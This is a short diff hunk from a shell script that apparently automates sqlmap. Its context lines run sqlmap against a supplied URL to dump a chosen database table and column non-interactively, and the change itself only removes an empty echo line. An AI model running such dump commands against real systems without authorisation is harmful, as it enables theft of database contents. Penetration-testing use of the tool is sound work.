@@ -80,4 +80,3 @@ echo
 python sqlmap.py -u "$link"-D $databasead -T $tabload -C $kolonad --dump --batch
 echo
 echo
-echo
